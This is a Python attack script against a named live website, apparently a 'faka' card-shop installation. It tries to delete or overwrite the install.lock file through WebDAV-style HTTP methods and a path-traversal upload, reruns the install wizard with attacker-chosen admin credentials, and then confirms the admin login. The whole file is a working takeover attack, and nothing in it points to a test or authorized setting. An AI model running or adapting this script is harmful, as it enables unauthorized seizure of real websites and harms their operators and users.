#!/usr/bin/env python3
"""qq1.lol install reinstall attack — delete install.lock and run wizard"""
import json
import os
import re
import subprocess
import tempfile
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "install_attack.log"
HITS = OUT / "install_hits.jsonl"
JAR = str(OUT / ".install_cookies")
ADMIN_USER = os.environ.get("QQ1_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("QQ1_ADMIN_PASS", "Qq1@Admin2026!")


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:3000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}")


def curl(url, method="GET", post=None, extra=None):
    cmd = ["curl", "-sk", "--max-time", "15", "-b", JAR, "-c", JAR, "-A", "Mozilla/5.0",
           "-H", f"Referer: {BASE}/", "-w", "\n__HTTP:%{http_code}__"]
    if extra:
        cmd += extra
    if method != "GET":
        cmd += ["-X", method]
    if post is not None:
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded", "-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=20).stdout
    except Exception as e:
        return f"err:{e}"


def get_csrf():
    page = curl(BASE + "/")
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', page)
    return m.group(1) if m else ""


def phase1_delete_lock():
    log("=== Phase1: delete install.lock ===")
    body = curl(f"{BASE}/install/install.lock")
    log(f"lock before: {body.split('__HTTP')[0]!r}")
    for method in ("DELETE", "PUT", "PATCH", "MOVE", "COPY"):
        r = curl(f"{BASE}/install/install.lock", method=method, post="")
        code = re.search(r"__HTTP:(\d+)__", r)
        log(f"  {method}: HTTP {code.group(1) if code else '?'}")
    # empty overwrite via PUT
    curl(f"{BASE}/install/install.lock", method="PUT", extra=["-H", "Content-Type: text/plain"], post="")
    # upload overwrite attempts
    csrf = get_csrf()
    empty = tempfile.NamedTemporaryFile(delete=False, suffix=".lock")
    empty.write(b"")
    empty.close()
    for name in ("install.lock", "../install/install.lock"):
        subprocess.run([
            "curl", "-sk", "--max-time", "12", "-b", JAR, "-c", JAR,
            "-F", f"csrf_token={csrf}", "-F", f"file=@{empty.name};filename={name}",
            f"{BASE}/ajax.php?act=upload",
        ], capture_output=True, text=True, timeout=15)
    os.unlink(empty.name)
    after = curl(f"{BASE}/install/install.lock").split("__HTTP")[0]
    log(f"lock after: {after!r}")
    return "安装锁" not in after or len(after.strip()) == 0


def phase2_install_wizard():
    log("=== Phase2: install wizard ===")
    idx = curl(f"{BASE}/install/index.php").split("__HTTP")[0]
    if "已经安装" in idx:
        log("still locked — wizard not accessible")
        return False
    hit("install_unlocked", "install/index.php accessible", idx[:500])
    # typical faka install steps
    steps = [
        ("step=2&db_host=127.0.0.1&db_port=3306&db_user=root&db_pwd=root&db_name=faka&db_prefix=shua_"),
        (f"step=3&admin_user={ADMIN_USER}&admin_pwd={ADMIN_PASS}&admin_email=admin@qq1.lol"),
        ("step=4&"),
    ]
    for post in steps:
        r = curl(f"{BASE}/install/index.php", "POST", post).split("__HTTP")[0]
        log(f"  POST {post[:40]}... -> {r[:120]}")
        if "成功" in r or "完成" in r:
            hit("install_done", post[:60], r)
            return True
    return False


def phase3_verify_admin():
    log("=== Phase3: verify admin login ===")
    for path in ("admin/", "admin/login.php", "htgl/", "shequ/login.php"):
        body = curl(f"{BASE}/{path}").split("__HTTP")[0]
        if body and "404" not in body[:80]:
            log(f"  {path}: {body[:100]}")
    csrf = get_csrf()
    for ep in ("ajax.php?act=login", "user/ajax.php?act=login"):
        r = curl(f"{BASE}/{ep}", "POST", f"user={ADMIN_USER}&pass={ADMIN_PASS}&csrf_token={csrf}")
        if '"code":0' in r:
            hit("admin_login", f"{ep} {ADMIN_USER}:{ADMIN_PASS}", r)


def main():
    log("=== INSTALL REINSTALL ATTACK START ===")
    curl(BASE + "/")
    deleted = phase1_delete_lock()
    if deleted:
        if phase2_install_wizard():
            phase3_verify_admin()
    else:
        log("BLOCKED: cannot delete install.lock remotely (need shell/RCE/file-delete vuln)")
    log("=== INSTALL ATTACK DONE ===")


if __name__ == "__main__":
    main()
